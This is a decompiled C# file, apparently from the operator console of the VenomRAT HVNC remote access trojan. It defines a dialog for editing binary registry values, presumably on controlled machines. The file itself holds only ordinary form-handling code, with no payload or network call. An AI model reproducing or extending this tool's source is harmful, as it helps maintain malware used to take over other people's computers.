using System;
using System.Windows.Forms;
using VenomRAT_HVNC.Server.Helper;

namespace VenomRAT_HVNC.Server.Forms
{
    // Token: 0x02000071 RID: 113
    public partial class FormRegValueEditBinary : Form
    {
        // Token: 0x06000437 RID: 1079 RVA: 0x0002730D File Offset: 0x0002730D
        public FormRegValueEditBinary(RegistrySeeker.RegValueData value)
        {
            this._value = value;
            this.InitializeComponent();
            this.valueNameTxtBox.Text = RegValueHelper.GetName(value.Name);
            this.hexEditor.HexTable = value.Data;
        }

        // Token: 0x06000438 RID: 1080 RVA: 0x0002734C File Offset: 0x0002734C
        private void okButton_Click(object sender, EventArgs e)
        {
            byte[] hexTable = this.hexEditor.HexTable;
            if (hexTable != null)
            {
                try
                {
                    this._value.Data = hexTable;
                    base.DialogResult = DialogResult.OK;
                    base.Tag = this._value;
                }
                catch
                {
                    this.ShowWarning("The binary value was invalid and could not be converted correctly.", "Warning");
                    base.DialogResult = DialogResult.None;
                }
            }
            base.Close();
        }

        // Token: 0x06000439 RID: 1081 RVA: 0x000273BC File Offset: 0x000273BC
        private void ShowWarning(string msg, string caption)
        {
            MessageBox.Show(msg, caption, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }

        // Token: 0x04000320 RID: 800
        private readonly RegistrySeeker.RegValueData _value;

        // Token: 0x04000321 RID: 801
        private const string INVALID_BINARY_ERROR = "The binary value was invalid and could not be converted correctly.";
    }
}